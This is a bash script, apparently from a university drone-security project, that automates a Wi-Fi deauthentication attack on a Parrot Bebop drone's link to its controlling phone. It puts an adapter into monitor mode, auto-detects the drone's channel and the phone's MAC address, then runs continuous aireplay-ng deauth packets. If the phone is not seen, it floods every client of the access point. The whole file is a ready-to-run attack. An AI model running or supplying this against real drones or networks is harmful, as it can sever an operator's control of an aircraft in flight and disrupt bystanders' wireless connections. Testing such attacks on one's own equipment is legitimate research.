#!/bin/bash

IFACE="wlx00c0cabe245c"
BSSID="A0:14:3D:A6:F1:D5"
VENV="/home/sakar/UNR_Projects/BebopDrone/.venv37/bin/python3"
FINDER="/home/sakar/UNR_Projects/BebopDrone/find_phone.py"
CHANFINDER="/home/sakar/UNR_Projects/BebopDrone/find_channel.py"

# Define cleanup function to kill all background processes on Ctrl+C
cleanup() {
    echo -e "\n[+] Caught Ctrl+C! Stopping all background processes cleanly..."
    # Kill all background jobs started by this script shell
    kill $(jobs -p) 2>/dev/null
    exit 0
}

# Set the trap at the beginning to catch Ctrl+C (SIGINT)
trap cleanup SIGINT

# 1. Put the interface into monitor mode
echo "[+] Setting $IFACE to monitor mode..."
sudo ip link set "$IFACE" down
sudo iw dev "$IFACE" set type monitor
sudo ip link set "$IFACE" up

# 2. Find the drone's channel automatically (channel-hop + beacon sniff).
#    Override by exporting CHANNEL=<n>; falls back to a manual airodump scan.
channel_num="${CHANNEL:-}"
if [ -z "$channel_num" ]; then
    echo "[+] Auto-detecting the drone's channel..."
    channel_num="$(sudo "$VENV" "$CHANFINDER" "$IFACE")"
fi
if [ -z "$channel_num" ]; then
    echo "[!] Auto-detect failed. Manual scan — find your target, then Ctrl-C."
    sudo airodump-ng "$IFACE"
    echo ""
    read -p "Enter the target channel number: " channel_num
fi

# 3. Lock the adapter to that channel (find_phone + deauth both need this)
sudo iw dev "$IFACE" set channel "$channel_num"
echo "[+] Locked to channel $channel_num."

# 5. Auto-detect the phone's (randomized) MAC — the busiest station in the
#    drone's BSS. No need to read it off airodump by hand anymore.
echo "[+] Detecting the phone's MAC..."
PHONE_MAC="$(sudo "$VENV" "$FINDER" "$IFACE")"

# 6. Launch the deauth attack against the detected client (or broadcast if the
#    phone wasn't seen — that still hits every client of the AP).
echo "[+] Starting aireplay-ng deauth attack..."
echo "[+] Press [CTRL+C] at any time to exit and stop all attacks perfectly."
if [ -n "$PHONE_MAC" ]; then
    echo "[+] Target: $PHONE_MAC"
    sudo aireplay-ng --deauth 0 -a "$BSSID" -c "$PHONE_MAC" "$IFACE"
else
    echo "[!] Phone not detected — falling back to broadcast deauth."
    sudo aireplay-ng --deauth 0 -a "$BSSID" "$IFACE"
fi

# If aireplay-ng exits on its own, trigger the cleanup function anyway
cleanup
